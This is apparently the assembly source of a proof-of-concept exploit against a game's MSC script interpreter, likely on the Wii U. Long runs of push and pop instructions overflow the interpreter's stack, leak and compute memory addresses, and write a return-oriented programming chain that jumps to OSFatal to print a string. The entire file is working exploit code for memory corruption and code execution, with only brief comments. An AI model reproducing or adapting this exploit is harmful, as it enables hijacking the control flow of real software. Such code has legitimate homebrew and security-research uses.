#Variable names
.alias 0,leakedAddress
.alias 1,mscStackAddress
.alias 2,calculatedStackPosition
.alias 3,mscScriptAddress

#Variables types
.alias 0,localVar
.alias 1,globalVar

#Position on the stack to write the ROP chain
.alias 0x1125877C,writePosition

#With diibugger (shifted stack) (Don't use this)
#.alias 0x1124D944,writePosition
 
#Use this to crash game on read/write
#.alias 0x0,writePosition

begin 0,0

#Get to end of stack for overflow
#Get to top of stack
pushShort. 0x1
pushShort. 0x2
pushShort. 0x3
pushShort. 0x4
pushShort. 0x5
pushShort. 0x6
pushShort. 0x7
pushShort. 0x8
pushShort. 0x9
pushShort. 0xa
pushShort. 0xb
pushShort. 0xc
pushShort. 0xd
pushShort. 0xe
pushShort. 0xf
pushShort. 0x10
pushShort. 0x11
pushShort. 0x12
pushShort. 0x13
pushShort. 0x14
pushShort. 0x15
pushShort. 0x16
pushShort. 0x17
pushShort. 0x18
pushShort. 0x19
pushShort. 0x1a
pushShort. 0x1b
pushShort. 0x1c
pushShort. 0x1d
pushShort. 0x1e
pushShort. 0x1f
pushShort. 0x20
pushShort. 0x21
pushShort. 0x22
pushShort. 0x23
pushShort. 0x24
pushShort. 0x25
pushShort. 0x26
pushShort. 0x27
pushShort. 0x28
pushShort. 0x29
pushShort. 0x2a
pushShort. 0x2b
pushShort. 0x2c
pushShort. 0x2d
pushShort. 0x2e
pushShort. 0x2f
pushShort. 0x30
pushShort. 0x31
pushShort. 0x32
pushShort. 0x33
pushShort. 0x34
pushShort. 0x35
pushShort. 0x36
pushShort. 0x37
pushShort. 0x38
pushShort. 0x39
pushShort. 0x3a
pushShort. 0x3b
pushShort. 0x3c
pushShort. 0x3d
pushShort. 0x3e
pushShort. 0x3f
pushShort. 0x40
pushShort. 0x41
pushShort. 0x42
pushShort. 0x43
pushShort. 0x44
pushShort. 0x45
pushShort. 0x46
pushShort. 0x47
pushShort. 0x48
pushShort. 0x49
pushShort. 0x4a
pushShort. 0x4b
pushShort. 0x4c
pushShort. 0x4d
pushShort. 0x4e
pushShort. 0x4f
pushShort. 0x50
pushShort. 0x51
pushShort. 0x52
pushShort. 0x53
pushShort. 0x54
pushShort. 0x55
pushShort. 0x56
pushShort. 0x57
pushShort. 0x58
pushShort. 0x59
pushShort. 0x5a
pushShort. 0x5b
pushShort. 0x5c
pushShort. 0x5d
pushShort. 0x5e
pushShort. 0x5f
pushShort. 0x60
pushShort. 0x61
pushShort. 0x62
pushShort. 0x63
pushShort. 0x64
pushShort. 0x65
pushShort. 0x66
pushShort. 0x67
pushShort. 0x68
pushShort. 0x69
pushShort. 0x6a
pushShort. 0x6b
pushShort. 0x6c
pushShort. 0x6d
pushShort. 0x6e
pushShort. 0x6f
pushShort. 0x70
pushShort. 0x71
pushShort. 0x72
pushShort. 0x73
pushShort. 0x74
pushShort. 0x75
pushShort. 0x76
pushShort. 0x77
pushShort. 0x78
pushShort. 0x79
pushShort. 0x7a
pushShort. 0x7b
pushShort. 0x7c
pushShort. 0x7d
pushShort. 0x7e
pushShort. 0x7f
pushShort. 0x80

#Overwrite MSC stack position
pushShort. 0xAE

#Store leaked address in GlobalVar0 to save for later
setVar globalVar,leakedAddress

#a few pops to get us back to reset our stack
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop

#Now that we are back at the beginning of the stack we can do our maths to calculate the position the stack needs to jump to the write area
pushVar. globalVar,leakedAddress
pushShort. 0x2B4
subi.
setVar globalVar,mscStackAddress
pushInt. writePosition
pushVar. globalVar,mscStackAddress
subi.
pushShort. 4
divi.
setVar globalVar,calculatedStackPosition

#Get to end of stack for overflow (again)
pushShort. 0x1
pushShort. 0x2
pushShort. 0x3
pushShort. 0x4
pushShort. 0x5
pushShort. 0x6
pushShort. 0x7
pushShort. 0x8
pushShort. 0x9
pushShort. 0xa
pushShort. 0xb
pushShort. 0xc
pushShort. 0xd
pushShort. 0xe
pushShort. 0xf
pushShort. 0x10
pushShort. 0x11
pushShort. 0x12
pushShort. 0x13
pushShort. 0x14
pushShort. 0x15
pushShort. 0x16
pushShort. 0x17
pushShort. 0x18
pushShort. 0x19
pushShort. 0x1a
pushShort. 0x1b
pushShort. 0x1c
pushShort. 0x1d
pushShort. 0x1e
pushShort. 0x1f
pushShort. 0x20
pushShort. 0x21
pushShort. 0x22
pushShort. 0x23
pushShort. 0x24
pushShort. 0x25
pushShort. 0x26
pushShort. 0x27
pushShort. 0x28
pushShort. 0x29
pushShort. 0x2a
pushShort. 0x2b
pushShort. 0x2c
pushShort. 0x2d
pushShort. 0x2e
pushShort. 0x2f
pushShort. 0x30
pushShort. 0x31
pushShort. 0x32
pushShort. 0x33
pushShort. 0x34
pushShort. 0x35
pushShort. 0x36
pushShort. 0x37
pushShort. 0x38
pushShort. 0x39
pushShort. 0x3a
pushShort. 0x3b
pushShort. 0x3c
pushShort. 0x3d
pushShort. 0x3e
pushShort. 0x3f
pushShort. 0x40
pushShort. 0x41
pushShort. 0x42
pushShort. 0x43
pushShort. 0x44
pushShort. 0x45
pushShort. 0x46
pushShort. 0x47
pushShort. 0x48
pushShort. 0x49
pushShort. 0x4a
pushShort. 0x4b
pushShort. 0x4c
pushShort. 0x4d
pushShort. 0x4e
pushShort. 0x4f
pushShort. 0x50
pushShort. 0x51
pushShort. 0x52
pushShort. 0x53
pushShort. 0x54
pushShort. 0x55
pushShort. 0x56
pushShort. 0x57
pushShort. 0x58
pushShort. 0x59
pushShort. 0x5a
pushShort. 0x5b
pushShort. 0x5c
pushShort. 0x5d
pushShort. 0x5e
pushShort. 0x5f
pushShort. 0x60
pushShort. 0x61
pushShort. 0x62
pushShort. 0x63
pushShort. 0x64
pushShort. 0x65
pushShort. 0x66
pushShort. 0x67
pushShort. 0x68
pushShort. 0x69
pushShort. 0x6a
pushShort. 0x6b
pushShort. 0x6c
pushShort. 0x6d
pushShort. 0x6e
pushShort. 0x6f
pushShort. 0x70
pushShort. 0x71
pushShort. 0x72
pushShort. 0x73
pushShort. 0x74
pushShort. 0x75
pushShort. 0x76
pushShort. 0x77
pushShort. 0x78
pushShort. 0x79
pushShort. 0x7a
pushShort. 0x7b
pushShort. 0x7c
pushShort. 0x7d
pushShort. 0x7e
pushShort. 0x7f
pushShort. 0x80

#get the base address of the MSC file
pushInt. -0x8A
setVar globalVar,mscScriptAddress
pushVar. globalVar,mscScriptAddress

#Get back to the stack safely by pushing real global vars and out of bound global vars
pushVar. globalVar,0x0
pushVar. globalVar,0x1
pushVar. globalVar,0x2
pushVar. globalVar,0x3
pushVar. globalVar,0x4
pushVar. globalVar,0x5
pushVar. globalVar,0x6
pushVar. globalVar,0x7
pushVar. globalVar,0x8
pushVar. globalVar,0x9
pushVar. globalVar,0xA
pushVar. globalVar,0xB
pushVar. globalVar,0xC
pushVar. globalVar,0xD
pushVar. globalVar,0xE
pushVar. globalVar,0xF
pushVar. globalVar,0x10
pushVar. globalVar,0x11
pushVar. globalVar,0x12
pushVar. globalVar,0x13
pushVar. globalVar,0x14
pushVar. globalVar,0x15
pushVar. globalVar,0x16
pushVar. globalVar,0x17
pushVar. globalVar,0x18
pushVar. globalVar,0x19
pushVar. globalVar,0x1A
pushVar. globalVar,0x1B
pushVar. globalVar,0x1C
pushVar. globalVar,0x1D
pushVar. globalVar,0x1E
pushVar. globalVar,0x1F
pushVar. globalVar,0x20
pushVar. globalVar,0x21
pushVar. globalVar,0x22
pushVar. globalVar,0x23
pushVar. globalVar,0x24
pushVar. globalVar,0x25
pushVar. globalVar,0x26
pushVar. globalVar,0x27
pushVar. globalVar,0x28
pushVar. globalVar,0x29
pushVar. globalVar,0x2A
pushVar. globalVar,0x2B
pushVar. globalVar,0x2C
pushVar. globalVar,0x2D
pushVar. globalVar,0x2E
pushVar. globalVar,0x2F
pushVar. globalVar,0x30
pushVar. globalVar,0x31
pushVar. globalVar,0x32
pushVar. globalVar,0x33
pushVar. globalVar,0x34
pushVar. globalVar,0x35
pushVar. globalVar,0x36
pushVar. globalVar,0x37
pushVar. globalVar,0x38
pushVar. globalVar,0x39
pushVar. globalVar,0x3A
pushVar. globalVar,0x3B
pushVar. globalVar,0x3C
pushVar. globalVar,0x3D
pushVar. globalVar,0x3E
pushVar. globalVar,0x3F
pushVar. globalVar,0x40
pushVar. globalVar,0x41
pushVar. globalVar,0x42
pushVar. globalVar,0x43
pushVar. globalVar,0x44
pushVar. globalVar,0x45
pushVar. globalVar,0x46
pushVar. globalVar,0x47
pushVar. globalVar,0x48
pushVar. globalVar,0x49
pushVar. globalVar,0x4A
pushVar. globalVar,0x4B
pushVar. globalVar,0x4C
pushVar. globalVar,0x4D
pushVar. globalVar,0x4E
pushVar. globalVar,0x4F
pushVar. globalVar,0x50
pushVar. globalVar,0x51
pushVar. globalVar,0x52
pushVar. globalVar,0x53
pushVar. globalVar,0x54
pushVar. globalVar,0x55
pushVar. globalVar,0x56
pushVar. globalVar,0x57
pushVar. globalVar,0x58
pushVar. globalVar,0x59
pushVar. globalVar,0x5A
pushVar. globalVar,0x5B
pushVar. globalVar,0x5C
pushVar. globalVar,0x5D
pushVar. globalVar,0x5E
pushVar. globalVar,0x5F
pushVar. globalVar,0x60
pushVar. globalVar,0x61
pushVar. globalVar,0x62
pushVar. globalVar,0x63
pushVar. globalVar,0x64
pushVar. globalVar,0x65
pushVar. globalVar,0x66
pushVar. globalVar,0x67
pushVar. globalVar,0x68
pushVar. globalVar,0x69
pushVar. globalVar,0x6A
pushVar. globalVar,0x6B
pushVar. globalVar,0x6C
pushVar. globalVar,0x6D
pushVar. globalVar,0x6E
pushVar. globalVar,0x6F
pushVar. globalVar,0x70
pushVar. globalVar,0x71
pushVar. globalVar,0x72
pushVar. globalVar,0x73
pushVar. globalVar,0x74
pushVar. globalVar,0x75
pushVar. globalVar,0x76
pushVar. globalVar,0x77
pushVar. globalVar,0x78
pushVar. globalVar,0x79
pushVar. globalVar,0x7A
pushVar. globalVar,0x7B
pushVar. globalVar,0x7C
pushVar. globalVar,0x7D
pushVar. globalVar,0x7E
pushVar. globalVar,0x7F
pushVar. globalVar,0x80
pushVar. globalVar,0x81
pushVar. globalVar,0x82
pushVar. globalVar,0x83
pushVar. globalVar,0x84
pushVar. globalVar,0x85
pushVar. globalVar,0x86
pushVar. globalVar,0x87
pushVar. globalVar,0x88
pushVar. globalVar,0x89

#Calculate absolute offset of the ROP chain (script offset + 0x30 + file offset)
pushShort. 0x30
#script_1 is the offset of the second "script", which contains our string to print out
pushInt. script_1 
addi.
i+= globalVar,mscScriptAddress

#Get back to end of stack for overflow for the millionth time
pushShort. 0x1
pushShort. 0x2
pushShort. 0x3
pushShort. 0x4
pushShort. 0x5
pushShort. 0x6
pushShort. 0x7
pushShort. 0x8
pushShort. 0x9
pushShort. 0xa
pushShort. 0xb
pushShort. 0xc
pushShort. 0xd
pushShort. 0xe
pushShort. 0xf
pushShort. 0x10
pushShort. 0x11
pushShort. 0x12
pushShort. 0x13
pushShort. 0x14
pushShort. 0x15
pushShort. 0x16
pushShort. 0x17
pushShort. 0x18
pushShort. 0x19
pushShort. 0x1a
pushShort. 0x1b
pushShort. 0x1c
pushShort. 0x1d
pushShort. 0x1e
pushShort. 0x1f
pushShort. 0x20
pushShort. 0x21
pushShort. 0x22
pushShort. 0x23
pushShort. 0x24
pushShort. 0x25
pushShort. 0x26
pushShort. 0x27
pushShort. 0x28
pushShort. 0x29
pushShort. 0x2a
pushShort. 0x2b
pushShort. 0x2c
pushShort. 0x2d
pushShort. 0x2e
pushShort. 0x2f
pushShort. 0x30
pushShort. 0x31
pushShort. 0x32
pushShort. 0x33
pushShort. 0x34
pushShort. 0x35
pushShort. 0x36
pushShort. 0x37
pushShort. 0x38
pushShort. 0x39
pushShort. 0x3a
pushShort. 0x3b
pushShort. 0x3c
pushShort. 0x3d
pushShort. 0x3e
pushShort. 0x3f
pushShort. 0x40
pushShort. 0x41
pushShort. 0x42
pushShort. 0x43
pushShort. 0x44
pushShort. 0x45
pushShort. 0x46
pushShort. 0x47
pushShort. 0x48
pushShort. 0x49
pushShort. 0x4a
pushShort. 0x4b
pushShort. 0x4c
pushShort. 0x4d
pushShort. 0x4e
pushShort. 0x4f
pushShort. 0x50
pushShort. 0x51
pushShort. 0x52
pushShort. 0x53
pushShort. 0x54
pushShort. 0x55
pushShort. 0x56
pushShort. 0x57
pushShort. 0x58
pushShort. 0x59
pushShort. 0x5a
pushShort. 0x5b
pushShort. 0x5c
pushShort. 0x5d
pushShort. 0x5e
pushShort. 0x5f
pushShort. 0x60
pushShort. 0x61
pushShort. 0x62
pushShort. 0x63
pushShort. 0x64
pushShort. 0x65
pushShort. 0x66
pushShort. 0x67
pushShort. 0x68
pushShort. 0x69
pushShort. 0x6a
pushShort. 0x6b
pushShort. 0x6c
pushShort. 0x6d
pushShort. 0x6e
pushShort. 0x6f
pushShort. 0x70
pushShort. 0x71
pushShort. 0x72
pushShort. 0x73
pushShort. 0x74
pushShort. 0x75
pushShort. 0x76
pushShort. 0x77
pushShort. 0x78
pushShort. 0x79
pushShort. 0x7a
pushShort. 0x7b
pushShort. 0x7c
pushShort. 0x7d
pushShort. 0x7e
pushShort. 0x7f
pushShort. 0x80

#Now we can overwrite the stack position with the one we calculated earlier to jump to the write position
pushVar. globalVar,calculatedStackPosition

#Write ROP chain
pushInt. 0xC00C650
pushVar. globalVar,mscScriptAddress #r3 value (will be printed by OSFatal)
pushInt. 0xBEEF0001
pushInt. 0xBEEF0002
pushInt. 0xBEEF0003
pushInt. 0xBEEF0004
pushInt. 0xBEEF0005
pushInt. 0xBEEF0006
pushInt. 0xBEEF0007
pushInt. 0xBEEF0008
pushInt. 0xBEEF0009
pushInt. 0xBEEF000A
pushInt. 0xBEEF000B
pushInt. 0xBEEF000C
pushInt. 0xBEEF000D
pushInt. 0xBEEF000E
pushInt. 0xBEEF000F
pushInt. 0xBEEF0010
pushInt. 0xBEEF0011
pushInt. 0xBEEF0012
pushInt. 0xBEEF0013
pushInt. 0xBEEF0014
pushInt. 0xBEEF0015
pushInt. 0xBEEF0016
pushInt. 0xBEEF0017
pushInt. 0xBEEF0018
pushInt. 0xBEEF0019
pushInt. 0xBEEF001A
pushInt. 0x01031618 #return address (OSFatal)

#Execute ROP chain
exit

#Dunno why but I figured I might as well put it here, should never hit this though
end